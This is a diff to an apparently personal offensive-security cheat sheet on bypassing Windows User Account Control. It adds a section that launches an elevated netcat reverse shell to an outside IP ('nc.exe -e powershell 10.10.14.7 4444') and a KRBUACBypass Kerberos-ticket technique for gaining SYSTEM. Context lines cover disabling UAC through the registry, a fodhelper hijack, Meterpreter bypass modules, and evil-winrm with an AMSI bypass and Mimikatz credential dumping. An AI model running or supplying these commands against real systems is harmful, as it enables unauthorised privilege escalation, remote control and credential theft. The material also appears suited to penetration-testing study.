@@ -1,5 +1,6 @@
 ## Check UAC Level
 ```
+UACscan.ps1
 To confirm if UAC is enabled do:
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
@@ -46,6 +47,13 @@ function Disable-UserAccessControl {
     Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
     Write-Host "User Access Control (UAC) has been disabled." -ForegroundColor Green    
 }
+```
+## UAC Disabled
+```
+If UAC is already disabled (ConsentPromptBehaviorAdmin is 0) you can execute a reverse shell with admin privileges (high integrity level) using something like:
+#Put your reverse shell instead of "calc.exe"
+Start-Process powershell -Verb runAs "calc.exe"
+Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
 
 ## Fodhelper
@@ -137,7 +145,7 @@ C:\> Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 So, what this script does is create a new progID with the name “.hack” and then directly associate the payload with the command used when opening such files. which then points the CurVer entry of ms-settings to our “.hack” progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the “.hack” program ID and use its associated command. 
 ```
 
-## msconfig    
+## msconfig (GUI)
 ```
 Case study : msconfig
 Spawn run and enter msconfig
@@ -147,7 +155,7 @@ There are exemptions that allow certain program binaries to execute without prom
 We will obtain a high IL command prompt without interacting with UAC in any way.
 ```
 
-## asman.msc
+## asman.msc (GUI)
 ```
 asman.msc
 Case Study : azman.msc (Authorization manager)
@@ -160,7 +168,7 @@ first spawn run and run  azman.msc
         We will right-click any part of the help menu, you can click on “help topics', then right click and ”view source",  select view source
 ```
 
-## Notepad
+## Notepad (GUI)
 ```
 Notepad        
 This will spawn a notepad process that we can leverage to get a shell. 
@@ -196,7 +204,7 @@ cmd> copy \\[kali]\[share]\rshell.exe rshell.exe
 cmd> .\uac-bypass.exe
 ```
 
-## Meterpreter UAC Bypass
+## Meterpreter UAC Bypass (CLI)
 ```
 There are several post-exploitation modules we can deploy against an active meterpreter session.
 Sessions that were created through attack vectors such as the execution of a client-side attack will likely provide us only with an unprivileged shell.
@@ -296,11 +304,35 @@ High
 The process our payload runs in has the integrity level High and therefore we have successfully bypassed UAC.
 ```
 
-## Evil-Winrm 4MSI Bypass
+## Evil-Winrm 4MSI Bypass (CLI + winrm)
 ```
 evil-winrm -i 192.168.1.19 -u administrator -p Riviera -s /opt/privsc/powershell
 Bypass-4MSI
 Invoke-Mimikatz.ps1
 Invoke-Mimikatz
 ```
+
+## KRBUACBypass (GUI)
+```
+https://github.com/wh0amitz/KRBUACBypass/releases/tag/v1.0.0
+UAC Bypass By Abusing Kerberos Tickets 
+First request a ticket for the HOST service of the current server through the asktgs function, and then create a system service through krbscm to gain the SYSTEM privilege.
+
+KRBUACBypass.exe asktgs
+KRBUACBypass.exe krbscm
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
